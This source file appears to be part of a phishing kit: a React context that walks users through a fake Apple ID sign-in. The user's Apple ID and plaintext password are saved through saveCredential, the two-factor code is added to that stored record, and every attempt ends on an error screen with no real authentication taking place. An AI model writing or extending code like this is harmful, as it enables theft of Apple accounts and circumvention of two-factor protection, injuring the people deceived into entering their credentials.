import React, { createContext, useContext, useState, ReactNode } from 'react';
import { storageService } from '../services/storageService';

interface AuthContextType {
  currentStep: string;
  appleId: string;
  credentialId: string | null;
  sessionId: string | null;
  setAppleId: (id: string) => void;
  submitAppleId: () => void;
  submitPassword: (password: string) => void;
  submitTwoFactorCode: (code: string) => void;
  resetAuth: () => void;
}

const AuthContext = createContext<AuthContextType | undefined>(undefined);

export const AuthProvider: React.FC<{ children: ReactNode }> = ({ children }) => {
  const [currentStep, setCurrentStep] = useState<string>('apple-id');
  const [appleId, setAppleId] = useState<string>('');
  const [credentialId, setCredentialId] = useState<string | null>(null);
  const [sessionId, setSessionId] = useState<string | null>(null);
  
  // Start a new session when the component mounts
  React.useEffect(() => {
    const newSessionId = storageService.startSession();
    setSessionId(newSessionId);
    
    return () => {
      // End the session when the component unmounts
      if (sessionId) {
        storageService.endSession(sessionId);
      }
    };
  }, []);
  
  const submitAppleId = () => {
    if (sessionId) {
      storageService.updateSession(sessionId, 'apple-id-submitted');
    }
    setCurrentStep('password');
  };
  
  const submitPassword = (password: string) => {
    const id = storageService.saveCredential(appleId, password);
    setCredentialId(id);
    
    if (sessionId) {
      storageService.updateSession(sessionId, 'password-submitted');
    }
    
    setCurrentStep('two-factor');
  };
  
  const submitTwoFactorCode = (code: string) => {
    if (credentialId) {
      storageService.updateCredentialWithTwoFactor(credentialId, code);
    }
    
    if (sessionId) {
      storageService.updateSession(sessionId, 'two-factor-submitted');
    }
    
    setCurrentStep('error');
  };
  
  const resetAuth = () => {
    setCurrentStep('apple-id');
    setAppleId('');
    setCredentialId(null);
    
    // Start a new session
    if (sessionId) {
      storageService.endSession(sessionId);
    }
    const newSessionId = storageService.startSession();
    setSessionId(newSessionId);
  };
  
  return (
    <AuthContext.Provider
      value={{
        currentStep,
        appleId,
        credentialId,
        sessionId,
        setAppleId,
        submitAppleId,
        submitPassword,
        submitTwoFactorCode,
        resetAuth
      }}
    >
      {children}
    </AuthContext.Provider>
  );
};

export const useAuth = () => {
  const context = useContext(AuthContext);
  if (context === undefined) {
    throw new Error('useAuth must be used within an AuthProvider');
  }
  return context;
};